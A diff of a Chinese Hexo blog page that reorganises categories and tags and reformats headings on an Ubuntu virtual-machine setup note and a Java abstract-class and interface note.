+        <a class="article-category-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a>
         </div>
     
     
@@ -1227,7 +1112,7 @@ class="article article-type-post"
   
     
       <article
-id="post-环境配置/Ubuntu (20.04)虚拟机安装配置"
+id="post-杂记/系统配置/Ubuntu (20.04)虚拟机安装配置"
 class="article article-type-post"
 >
 
@@ -1238,14 +1123,15 @@ class="article article-type-post"
 
     <div class="article-body">
     <header class="article-title">
-        <a href="/2020/05/12/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/">Ubuntu (20.04)虚拟机安装配置</a>
+        <a href="/2020/05/12/%E6%9D%82%E8%AE%B0/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/Ubuntu%20(20.04)%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/">Ubuntu (20.04)虚拟机安装配置</a>
     </header>
     <div class="article-entry post-inner-html">
         
         <p>VMWare 安装Ubuntu系统时一般会默认使用简易安装，会有一个安装<code>open-vm-tools</code>的过程，如果在这里卡了很长时间，可以尝试关闭虚拟机再重新启动，完成安装过程</p>
-<h2 id="换源"><a class="header-anchor" href="#换源"></a>换源</h2>
-<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源的链接是不同的，需要自己去官网找。</p>
-<h2 id="安装中文输入法"><a class="header-anchor" href="#安装中文输入法"></a>安装中文输入法</h2>
+<h1>换源</h1>
+<p>Ubuntu安装好之后首先要做的就是换源，需要<strong>特别注意的一点</strong>是不要随便从一篇博客里复制粘贴源的地址到<code>/etc/apt/sources.list</code>，因为每个不同版本的Ubuntu分别有自己的代号，源链接不同，需要自己去官网找。</p>
+<p>参考：<a href="https://mirrors.ustc.edu.cn/help/ubuntu.html">https://mirrors.ustc.edu.cn/help/ubuntu.html</a></p>
+<h1>安装中文输入法</h1>
 <p>设置-&gt;区域和语言-&gt;管理已安装的语言</p>
 <p>弹出<code>语言支持</code>的窗口，选择<code>添加或删除语言</code>，找到中文简体，应用，然后设置<code>地区格式</code>，应用后关闭该窗口。</p>
 <p>回到<code>区域和语言</code>，设置<code>格式</code>为中国，然后注销，重新登陆，再次打开这个界面就可以添加中文输入法了。</p>
@@ -1268,12 +1154,12 @@ class="article article-type-post"
 </div>
     
         <div class="article-category">
-        <a class="article-category-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a>
+        <a class="article-category-link" href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a>
         </div>
     
     
         <div class="article-tag">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="tag">环境配置</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/" rel="tag">系统配置</a></li></ul>
         </div>
     
     </div>
@@ -1285,7 +1171,7 @@ class="article article-type-post"
   
     
       <article
-id="post-编程语言/Java/抽象类和接口"
+id="post-计算机基础/编程语言/Java/Java-抽象类和接口"
 class="article article-type-post"
 >
 
@@ -1296,11 +1182,11 @@ class="article article-type-post"
 
     <div class="article-body">
     <header class="article-title">
-        <a href="/2020/04/27/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3/">Java 抽象类和接口</a>
+        <a href="/2020/04/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E6%8A%BD%E8%B1%A1%E7%B1%BB%E5%92%8C%E6%8E%A5%E5%8F%A3/">Java-抽象类和接口</a>
     </header>
     <div class="article-entry post-inner-html">
         
-        <h2 id="抽象类"><a class="header-anchor" href="#抽象类"></a>抽象类</h2>
+        <h1>抽象类</h1>
 <p>作用：主要起到一个模板的作用，抽象类中的抽象方法必须被子类实现，这样就可以使用一个统一的方法名来调用子类方法。</p>
 <p>抽象类无法直接创建对象，必须被继承；抽象方法也必须在子类中被重写。</p>
 <p>抽象类中的方法可以是非抽象的（即可以有方法体），但即使类中没有抽象方法，抽象类也无法被实例化；反过来，如果一个类中有抽象方法，那么这个类必须声明为抽象类。</p>
@@ -1310,19 +1196,19 @@ class="article article-type-post"
 	public abstract void fun();
 }
 </code></pre>
-<h2 id="接口"><a class="header-anchor" href="#接口"></a>接口</h2>
+<h1>接口</h1>
 <p>接口和抽象类有点像，它是抽象方法的集合；</p>
 <p>一个类只能继承自一个父类，但是可以实现多个接口。间接实现了多继承；</p>
 <p>另外接口中可以有有成员变量，但默认都是 <code>public static final</code>的，这三个关键字可以省略；</p>
 <p>接口中的方法默认都是抽象的（即不能有方法体），定义时可以不写<code>abstract</code>，实现接口的类必须实现接口中定义的所有方法，否则该类必须为抽象类。</p>
-<h3 id="声明"><a class="header-anchor" href="#声明"></a>声明</h3>
+<h2 id="声明"><a class="header-anchor" href="#声明"></a>声明</h2>
 <p>关键字：<code>interface</code></p>
 <pre><code>[访问控制关键字] interface 接口名称 [extends 其他的接口名] {
         // 声明变量
         // 抽象方法
 }
 </code></pre>
-<h3 id="实现"><a class="header-anchor" href="#实现"></a>实现</h3>
+<h2 id="实现"><a class="header-anchor" href="#实现"></a>实现</h2>
 <p>关键字：<code>implements</code></p>
 <pre><code>public class A implements 接口名称 [,接口名称,...]{
 		//实现接口中的方法
@@ -1347,7 +1233,7 @@ class="article article-type-post"
 </div>
     
         <div class="article-category">
-        <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a>
+        <a class="article-category-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a>
         </div>
     
     
@@ -1386,7 +1272,7 @@ class="article article-type-post"
   <div class="widget-wrap widget-cate">
     <div class="widget-title"><span>Categories</span></div>
     <div class="widget-inner">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/web/">web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/%E6%9D%82%E9%A1%B9/">杂项</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E7%BA%A2%E5%86%9B/">安全红军</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%85%A8%E8%93%9D%E5%86%9B/">安全蓝军</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/Markdown/">Markdown</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">正则表达式</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/">Python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/go/">go</a></li></ul></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7/">工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">漏洞研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/">红队技术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF/">蓝队技术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a></li></ul>
     </div>
   </div>
 
@@ -1396,7 +1282,7 @@ class="article article-type-post"
   <div class="widget-wrap widget-tags">
     <div class="widget-title"><span>Tags</span></div>
     <div class="widget-inner">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GUI/" rel="tag">GUI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Markdown/" rel="tag">Markdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSH/" rel="tag">SSH</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/go/" rel="tag">go</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kafka/" rel="tag">kafka</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali/" rel="tag">kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/" rel="tag">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/" rel="tag">sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/" rel="tag">密码算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B9%B6%E5%8F%91/" rel="tag">并发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="tag">操作系统</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag">文件上传</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="tag">正则表达式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" rel="tag">消息队列</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" rel="tag">环境配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/" rel="tag">系统配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%A2%E8%AF%95/" rel="tag">面试</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GUI/" rel="tag">GUI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Markdown/" rel="tag">Markdown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WriteUp/" rel="tag">WriteUp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/" rel="tag">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kafka/" rel="tag">kafka</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/" rel="tag">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/" rel="tag">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%B3%E4%BA%8E%E6%88%91/" rel="tag">关于我</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" rel="tag">基础知识</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%87%E5%BF%98%E5%BD%95/" rel="tag">备忘录</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/" rel="tag">密码算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">小工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" rel="tag">操作系统</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9A%97%E7%BD%91/" rel="tag">暗网</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/" rel="tag">正则表达式</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/" rel="tag">消息队列</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/" rel="tag">系统配置</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E4%BB%A3%E7%90%86/" rel="tag">网络代理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li></ul>
     </div>
   </div>
 
@@ -1409,7 +1295,7 @@ class="article article-type-post"
       <ul>
         
           <li>
-            <a href="/2022/12/27/%E5%B7%A5%E5%85%B7/redis/">Redis笔记</a>
+            <a href="/2022/12/27/%E5%B7%A5%E5%85%B7/Redis%E7%AC%94%E8%AE%B0/">Redis笔记</a>
           </li>
         
           <li>
@@ -1417,15 +1303,15 @@ class="article article-type-post"
           </li>
         
           <li>
-            <a href="/2022/07/13/%E6%BC%8F%E6%B4%9E/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">漏洞/Java反序列化漏洞</a>
+            <a href="/2022/07/13/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">Java反序列化漏洞</a>
           </li>
         
           <li>
-            <a href="/2021/08/09/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/">密码算法</a>
+            <a href="/2021/08/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95/">密码算法</a>
           </li>
         
           <li>
-            <a href="/2021/07/26/%E5%B7%A5%E5%85%B7/git/">git笔记</a>
+            <a href="/2021/07/26/%E5%B7%A5%E5%85%B7/git%E7%AC%94%E8%AE%B0/">git笔记</a>
           </li>
         
       </ul>
